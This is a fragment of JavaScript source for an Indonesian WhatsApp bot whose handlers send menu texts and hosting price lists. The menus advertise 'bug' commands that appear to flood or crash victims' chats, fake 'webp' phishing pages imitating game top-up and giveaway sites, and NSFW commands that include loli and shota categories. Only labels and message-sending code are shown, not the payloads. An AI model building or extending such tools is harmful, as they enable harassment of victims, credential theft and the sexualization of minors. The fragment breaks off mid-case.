 ┣┣⃟❍𒁂⃝➢${prefix}tools2
 
▭▬▭( *PANEL MENU* )▭▬▭

⭔${prefix}serverpanel1

▬▭( *OTOMATIS MENU* )▭▬

⭔●${prefix}buysrv
⭔●${prefix}buyvps
⭔●${prefix}buysc
⭔●${prefix}buyowner
⭔●${prefix}buyprem

▭▬▭( *PM2 MENU* )▭▬▭

⭔ ${prefix}buycasepm2
⭔ ${prefix}buyeggpm2
⭔ ${prefix}buyapipm2
⭔ ${prefix}buyscpm2

▭▬▭( *SEWABOT MENU* )▭▬▭

⭔ ${prefix}buysewainbot
⭔ ${prefix}listsewa
⭔ ${prefix}konfirsewa
⭔ ${prefix}cancelsewa
⭔ ${prefix}sewa
⭔ ${prefix}buysewa
⭔ ${prefix}listsewa

▬▭( *WEBP MENU* )▭▬
⭔ ${prefix}webp1 (MediaFire Cahyo)
⭔ ${prefix}webp2 (MediaFire File)
⭔ ${prefix}webp3 (Grup wa 18+)
⭔ ${prefix}webp4 (Codashop FF)
⭔ ${prefix}webp5 (FF Spin SG)
⭔ ${prefix}webp6 (FF Claim)
⭔ ${prefix}webp7 (Pubgm12)
⭔ ${prefix}webp8 (Mobile-Legends)
⭔ ${prefix}webp9 (Simontok Full Info)
⭔ ${prefix}bahanYT
⭔ ${prefix}bahantwit
⭔ ${prefix}addgcweb
*WEBP MASIH ADA PERKEMBANGAN*

╭––『 Anime NSFW 』
┆❏⭔●${prefix}hentai 🅕
┆❏⭔●${prefix}gifhentai 🅕
┆❏⭔●${prefix}gifblowjob 🅕
┆❏⭔●${prefix}hentaivid 🅕
┆❏⭔●${prefix}hneko 🅕
┆❏⭔●${prefix}nwaifu 🅕
┆❏⭔●${prefix}animespank 🅕
┆❏⭔●${prefix}trap 🅕
┆❏⭔●${prefix}gasm 🅕
┆❏⭔●${prefix}ahegao 🅕
┆❏⭔●${prefix}ass 🅕
┆❏⭔●${prefix}bdsm 🅕
┆❏⭔●${prefix}blowjob 🅕
┆❏⭔●${prefix}cuckold 🅕
┆❏⭔●${prefix}cum 🅕
┆❏⭔●${prefix}milf 🅕
┆❏⭔●${prefix}eba 🅕
┆❏⭔●${prefix}ero 🅕
┆❏⭔●${prefix}femdom 🅕
┆❏⭔●${prefix}foot 🅕
┆❏⭔●${prefix}gangbang 🅕
┆❏⭔●${prefix}glasses 🅕
┆❏⭔●${prefix}jahy 🅕
┆❏⭔●${prefix}masturbation 🅕
┆❏⭔●${prefix}manga 🅕
┆❏⭔●${prefix}neko-hentai 🅕
┆❏⭔●${prefix}neko-hentai2 🅕
┆❏⭔●${prefix}nsfwloli 🅕
┆❏⭔●${prefix}orgy 🅕
┆❏⭔●${prefix}panties 🅕 
┆❏⭔●${prefix}pussy 🅕
┆❏⭔●${prefix}tentacles 🅕
┆❏⭔●${prefix}thighs 🅕
┆❏⭔●${prefix}yuri 🅕
┆❏⭔●${prefix}zettai 🅕

╭––『 AnimeV2 』
┆❏⭔●${prefix}akira 🅕
┆❏⭔●${prefix}akiyama 🅕
┆❏⭔●${prefix}ana ??
┆❏⭔●${prefix}asuna 🅕
┆❏⭔●${prefix}ayuzawa 🅕
┆❏⭔●${prefix}boruto 🅕
┆❏⭔●${prefix}chiho 🅕
┆❏⭔●${prefix}chitoge 🅕
┆❏⭔●${prefix}cosplayloli 🅕
┆❏⭔●${prefix}cosplaysagiri 🅕
┆❏⭔●${prefix}deidara 🅕
┆❏⭔●${prefix}doraemon 🅕
┆❏⭔●${prefix}elaina 🅕
┆❏⭔●${prefix}emilia 🅕
┆❏⭔●${prefix}erza 🅕
┆❏⭔●${prefix}gremory 🅕
┆❏⭔●${prefix}hestia 🅕
┆❏⭔●${prefix}hinata 🅕
┆❏⭔●${prefix}husbu 🅕
┆❏⭔●${prefix}inori 🅕
┆❏⭔●${prefix}isuzu 🅕
┆❏⭔●${prefix}itachi 🅕
┆❏⭔●${prefix}itori 🅕
┆❏⭔●${prefix}kaga 🅕
┆❏⭔●${prefix}kagura 🅕
┆❏⭔●${prefix}kakasih 🅕
┆❏⭔●${prefix}kaori 🅕
┆❏⭔●${prefix}keneki 🅕
┆❏⭔●${prefix}kotori 🅕
┆❏⭔●${prefix}kurumi 🅕
┆❏⭔●${prefix}loli 🅕
┆❏⭔●${prefix}madara 🅕
┆❏⭔●${prefix}megumin 🅕
┆❏⭔●${prefix}mikasa 🅕
┆❏⭔●${prefix}mikey 🅕
┆❏⭔●${prefix}miku 🅕
┆❏⭔●${prefix}minato 🅕
┆❏⭔●${prefix}naruto 🅕
┆❏⭔●${prefix}neko 🅕
┆❏⭔●${prefix}neko2 🅕
┆❏⭔●${prefix}nekonime 🅕
┆❏⭔●${prefix}nezuko 🅕
┆❏⭔●${prefix}onepiece 🅕
┆❏⭔●${prefix}pokemon 🅕
┆❏⭔●${prefix}randomnime 🅕
┆❏⭔●${prefix}randomnime2 🅕
┆❏⭔●${prefix}rize 🅕
┆❏⭔●${prefix}sagiri 🅕
┆❏⭔●${prefix}sakura 🅕
┆❏⭔●${prefix}sasuke 🅕
┆❏⭔●${prefix}shina 🅕
┆❏⭔●${prefix}shinka 🅕
┆❏⭔●${prefix}shinomiya 🅕
┆❏⭔●${prefix}shizuka 🅕
┆❏⭔●${prefix}shota 🅕
┆❏⭔●${prefix}tejina 🅕
┆❏⭔●${prefix}toukachan 🅕
┆❏⭔●${prefix}tsunade 🅕
┆❏⭔●${prefix}waifu 🅕
┆❏⭔●${prefix}animewall 🅕
┆❏⭔●${prefix}yotsuba 🅕
┆❏⭔●${prefix}yuki 🅕
┆❏⭔●${prefix}yulibocil 🅕
┆❏⭔●${prefix}yumeko 🅕
┆❏⭔●${prefix}8ball 🅕
┆❏⭔●${prefix}tickle 🅕
┆❏⭔●${prefix}gecg 🅕
┆❏⭔●${prefix}feed 🅕
┆❏⭔●${prefix}animeawoo 🅕
┆❏⭔●${prefix}animemegumin 🅕
┆❏⭔●${prefix}animeshinobu 🅕
┆❏⭔●${prefix}animehandhold 🅕
┆❏⭔●${prefix}animehighfive 🅕
┆❏⭔●${prefix}animecringe 🅕
┆❏⭔●${prefix}animedance 🅕
┆❏⭔●${prefix}animehappy 🅕
┆❏⭔●${prefix}animeglomp 🅕
┆❏⭔●${prefix}animeblush 🅕
┆❏⭔●${prefix}animesmug 🅕
┆❏⭔●${prefix}animewave 🅕
┆❏⭔●${prefix}animesmille 🅕
┆❏⭔●${prefix}animepoke 🅕
┆❏⭔●${prefix}animewink 🅕
┆❏⭔●${prefix}animebonk 🅕
┆❏⭔●${prefix}animebully 🅕
┆❏⭔●${prefix}animeyeet 🅕
┆❏⭔●${prefix}animebite 🅕
┆❏⭔●${prefix}animelick 🅕
┆❏⭔●${prefix}animekill 🅕
┆❏⭔●${prefix}animecry 🅕
┆❏⭔●${prefix}animewlp 🅕
┆❏⭔●${prefix}animekiss 🅕
┆❏⭔●${prefix}animehug 🅕
┆❏⭔●${prefix}animeneko 🅕
┆❏⭔●${prefix}animepat 🅕
┆❏⭔●${prefix}animeslap 🅕
┆❏⭔●${prefix}animecuddle 🅕
┆❏⭔●${prefix}banimewaifu 🅕
┆❏⭔●${prefix}animenom 🅕
┆❏⭔●${prefix}animefoxgirl 🅕
┆❏⭔●${prefix}animegecg 🅕
┆❏⭔●${prefix}animetickle 🅕
┆❏⭔●${prefix}animefeed 🅕
┆❏⭔●${prefix}animeavatar 🅕
┆❏⭔●${prefix}genshin 🅕
┆❏⭔●${prefix}anime 🅕

▭▬▭( *BUG NEW MENU* )▭▬▭

⭔ ${prefix}sendinvite  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}puh  (ᴋʜᴜsᴜs ɢᴄ / ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}santetgcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}santetnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}gasfullgcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlidelaygcnew (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlilaggcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlibomgcnew  (ᴋʜᴜsᴜs ɢᴄ) 
⭔ ${prefix}unlicuygcnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ
⭔ ${prefix}sendgasfulnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlidelaynew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlilagnew   (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlibomnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlicuynew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlitetnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlidelaynew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlilagnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlibomnew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlicuynew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlidocunew (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlitrolinew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}unlivirtextnew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlidocunew  (ᴋʜᴜsᴜs ᴘʀɪʙᴀᴅɪ) 
⭔ ${prefix}sendunlitrolinew  (ᴋʜᴜsᴜsᴘʀɪʙᴀᴅɪ

  *ʙʏ ʀɪᴏᴏ ʜᴏsᴛɪɴɢ ʀᴇᴄᴏᴅᴇ ʙᴜɢ ɴᴇᴡ*

▭▬▭( *ᴄʀᴇᴅɪᴛs ᴛʜᴀɴᴋs ᴀʟʟ* )▭▬▭

⭔ Hw Mods Wa / Haikal (Base)
⭔ KIRBOTZ (BASE)
⭔ 𝙍𝙞𝙤𝙤 𝙊𝙛𝙛𝙞𝙘𝙞𝙖𝙡 (𝙍𝙀𝘾𝙊𝘿𝙀 𝙂𝙒 𝙅𝘼𝙉𝙂𝘼𝙉 𝘿𝙄 𝙃𝘼𝙋𝙐𝙎)
⭔ ZxV ViSi0N | Team
⭔ Adiwajshing (Baileys)
⭔ Whiskeysockets (Baileys)
⭔ Thunder X7 (Inspirate)
⭔ Pak Tzy (Inspirate)
⭔ Admchzingod (pack txt)
⭔ Kevizinmaker (pack txt)

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/audio1.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "bugmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *BUG MENU* )▭▬▭

⭔ ${prefix}bugnumber
⭔ ${prefix}buggroup
⭔ ${prefix}bannedmenu
⭔ ${prefix}unbanmenu
⭔ ${prefix}bugemoji
⭔ ${prefix}sewabotmenu

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "othermenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *OTHER MENU* )▭▬▭

┆❏.ping 🅕
┆❏.menu 🅕
┆❏.myip 🅕
┆❏.reportbug 🅕
┆❏.owner 🅕
┆❏.donate 🅕
┆❏.friend 🅕
┆❏.obfuscate 🅕
┆❏.styletext 🅕
┆❏.fliptext 🅕
┆❏.tts 🅕
┆❏.say 🅕
┆❏.togif 🅕
┆❏.toqr 🅕
┆❏.bass 🅕
┆❏.blown 🅕
┆❏.deep 🅕
┆❏.earrape 🅕
┆❏.fast 🅕
┆❏.fat 🅕
┆❏.nightcore 🅕
┆❏.reverse 🅕
┆❏.robot 🅕
┆❏.slow 🅕
┆❏.smooth 🅕
┆❏.squirrel 🅕
┆❏.tinyurl 🅕
┆❏.tovn 🅕
┆❏.toaudio 🅕
┆❏.tomp3 🅕
┆❏.tomp4🅕
┆❏.toimg 🅕
┆❏.toonce 🅕
┆❏.sticker 🅕
┆❏.take 🅟
┆❏.emoji 🅕
┆❏.volume 🅕
┆❏.ebinary 🅕
┆❏.dbinary 🅕
┆❏.ssweb 🅕
┆❏.quoted 🅕
┆❏.runtime 🅕
┆❏.sound1 - sound161 🅕

 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted:m})
await Biiofc.sendMessage(m.chat, {audio: fs.readFileSync('./freya/audio.mp3'),mimetype: 'audio/mpeg',ptt: true}, {quoted:m})}
break
case "listpanelpublic": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST PANEL PUBLIC* )▭▬▭

_📮RAM 1 GB CPU 30% RP 1.000 / BULAN_
_📮RAM 2 GB CPU 60% RP 2.000 / BULAN_
_📮RAM 3 GB CPU 80% RP 3.000 / BULAN_
_📮RAM 4 GB CPU 110% RP 4.000 / BULAN_
_📮RAM 5 GB CPU 140% RP 5.000 / BULAN_
_📮RAM 6 GB CPU 170% RP 6.000 / BULAN_
_📮RAM 7 GB CPU 180% RP 7.000 / BULAN_
_📮RAM 8 GB CPU 190% RP 8.000 / BULAN_
_📮RAM & CPU UNLIMITED RP 10.000 / BULAN_

*KEUNTUNGAN :*
- Untuk Bikin Bot
- Tidak Memboros Kouta
- Bot Menjadi On 24 Jam
- Bot Menjadi Fastrespon
- Web Pannel Close Bot Tetap On

- BUY PANEL UNLI FREE SC HW 22

*JIKA MINAT CHAT ADMIN Kontol*
Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "listpanelprivate": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST PANEL PRIVATE* )▭▬▭

_📮RAM 1 GB CPU 30% RP 3.000 / BULAN_
_📮RAM 2 GB CPU 60% RP 5.000 / BULAN_
_📮RAM 3 GB CPU 80% RP 7.000 / BULAN_
_📮RAM 4 GB CPU 110% RP 9.000 / BULAN_
_📮RAM 5 GB CPU 140% RP 12.000 / BULAN_
_📮RAM 6 GB CPU 170% RP 14.000 / BULAN_
_📮RAM 7 GB CPU 180% RP 16.000 / BULAN_
_📮RAM 8 GB CPU 190% RP 20.000 / BULAN_
_📮RAM & CPU UNLIMITED RP 25.000 / BULAN_

*KEUNTUNGAN :*
- Untuk Bikin Bot
- Server Ini Aman anti colong
- Tidak Memboros Kouta
- Bot Menjadi On 24 Jam
- Bot Menjadi Fastrespon
- Web Pannel Close Bot Tetap On

- BUY PANEL UNLI FREE SC PUSH KONTAK

*JIKA MINAT CHAT ADMIN RafatharOffcial*
Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "listvps1": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST VPS LINODE* )▭▬▭

🚀 RAM 1GB CORE 1 : => *20K* <=
🚀 RAM 2GB CORE 1 : => *25K* <=
🚀 RAM 4GB CORE 2 : => *45K* <=
🚀 RAM 8GB CORE 4 : => *55K* <=
🚀 RAM 16GB CORE 6 : => *80K* <=

=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL


 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
 case "listvps2": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const textbi = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *LIST VPS DIGITAL OCEAN* )▭▬▭


🚀 RAM 2GB CORE 1 : => *25K* <=
🚀 RAM 4GB CORE 2 : => *45K* <=
🚀 RAM 8GB CORE 4 : => *55K* <=
🚀 RAM 16GB CORE 6 : => ~*130K*~ > *80K* <=

=>   *_𝙂𝙤𝙤𝙙 𝙌𝙪𝙖𝙡𝙞𝙩𝙮 ✅_* <=
=>   *_𝘽𝙚𝙧𝙜𝙖𝙧𝙖𝙣𝙨𝙞 ✅_*      <=
=>   *_𝘿𝙖𝙥𝙚𝙩 𝘽𝙤𝙣𝙪𝙨 ✅_*  <=

*‼️GARANSI ON JIKA TIDAK MELANGGAR TOS!!!*
1. NO MINING
2. NO CPU 100%
3. NO USE DDOS
*_GARANSI 10H ON ✅_*

*JIKA MELANGGAR T.O.S GARANSI HANGUS!!!*

*MAU CLAIM GARANSI? KIRIM BUKTI TRANSFER & CHAT*
‼️NO BUKTI NO GARANSI
‼️ MAKSA REFF NO BUKTI? BLOCK!!! 

*KEUNTUNGAN BUY VPS?*
📍BISA OPEN ADMIN PANEL
📍BISA OPEN RESELLER PANEL
📍BISA DI PAKAI BUAT SERVER PRIBADI
📍BISA JUALAN PANEL
📍BISA OPEN JASA RUN BOT
📍BISA OPEN MURPUSH
📍BISA OPEN MURBUG DLL


 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textbi,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "downloadmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *DOWNLOAD MENU* )▭▬▭

❏${prefix}ytsearch 🅕
┆❏${prefix}play 🅕
┆❏${prefix}ytmp3 🅕
┆❏${prefix}ytmp4 🅕
┆❏${prefix}google 🅕
┆❏${prefix}imdb 🅕
┆❏${prefix}weather 🅕
┆❏${prefix}wanumber 🅕
┆❏${prefix}instaimg 🅕
┆❏${prefix}instavid 🅕
┆❏${prefix}fbvid 🅕
┆❏${prefix}twittervid 🅕
┆❏${prefix}telestick 🅟
┆❏${prefix}spotify 🅟
┆❏${prefix}gitclone 🅕
┆❏${prefix}happymod 🅕
┆❏${prefix}gdrive 🅕
┆❏${prefix}pinterest 🅕
┆❏${prefix}ringtone 🅕
┆❏${prefix}lyrics 🅕

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "funmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *FUN MENU* )▭▬▭

❏.define 🅕
┆❏.qc 🅕
┆❏.lyrics 🅕
┆❏.tictactoe 🅕
┆❏.suit 🅕
┆❏.math 🅕
┆❏.fact 🅕
┆❏.truth 🅕
┆❏.dare 🅕
┆❏.couple 🅕
┆❏.soulmate 🅕
┆❏.stupidcheck 🅕
┆❏.handsomecheck 🅕
┆❏.uncleancheck 🅕
┆❏.hotcheck 🅕
┆❏.smartcheck 🅕
┆❏.greatcheck 🅕
┆❏.evilcheck 🅕
┆❏.dogcheck 🅕
┆❏.coolcheck 🅕
┆❏.waifucheck 🅕
┆❏.awesomecheck 🅕
┆❏.gaycheck 🅕
┆❏.cutecheck 🅕
┆❏.lesbiancheck 🅕
┆❏.hornycheck 🅕
┆❏.prettycheck 🅕
┆❏.lovelycheck 🅕
┆❏.uglycheck 🅕
┆❏.pick 🅕
┆❏.quotes 🅕
┆❏.can 🅕
┆❏.is 🅕
┆❏.when 🅕
┆❏.where 🅕
┆❏.what 🅕
┆❏.how 🅕
┆❏.rate 🅕
┆❏.cry 🅕
┆❏.kill 🅕
┆❏.hug 🅕
┆❏.pat 🅕
┆❏.lick 🅕 
┆❏.kiss 🅕
┆❏.bite 🅕
┆❏.yeet 🅕
┆❏.bully 🅕
┆❏.bonk 🅕
┆❏.wink 🅕
┆❏.poke 🅕
┆❏.nom 🅕
┆❏.slap 🅕
┆❏.smile 🅕 
┆❏.wave 🅕
┆❏.awoo 🅕
┆❏.blush 🅕
┆❏.smug 🅕
┆❏.glomp 🅕 
┆❏.happy 🅕
┆❏.dance 🅕
┆❏.cringe 🅕
┆❏.cuddle 🅕
┆❏.highfive 🅕 
┆❏.shinobu 🅕
┆❏.handhold 🅕
┆❏.spank 🅕
┆❏.tickle 🅕
┆❏.avatar 🅕
┆❏.feed 🅕
┆❏.gecg 🅕
┆❏.checkme 🅕

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
case "ramlist1": { 
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isPremium && !isOwner) return reply(mess.only.premium)
const owned = `${owner}@s.whatsapp.net`
const version = require("baileys/package.json").version
const text12 = `*Hi @${sender.split("@")[0]} 👋*

▭▬▭( *RAM YANG TERSEDIA* )▭▬▭

*SERVER 1*
⭔1GBB ( *Premium* )✅
⭔2GBB ( *Premium* )✅
⭔3GBB ( *Premium* )✅
⭔4GBB ( *Premium* )✅
⭔5GBB ( *Premium* )✅
⭔6GBB ( *Owner* )✅
⭔7GBB ( *Owner* )✅
⭔8GBB ( *Owner* )✅
⭔9GBB ( *Owner* )✅
⭔UNLI ( *Owner* )✅

*JOIN RESELLER CUMA 8K BANG😁*
 Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: text12,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/34363c995351e9ac46715.jpg',
sourceUrl: "https://chat.whatsapp.com/ERJYROUy4roJXCxZ6zJrHB",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
} freya = fs.readFileSync('./freya/ramlist.mp3')
Biiofc.sendMessage(m.chat, {audio: freya, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
break
case "groupmenu": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:fkontak})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const txtus = `*Hi @${sender.split("@")[0]} 👋*

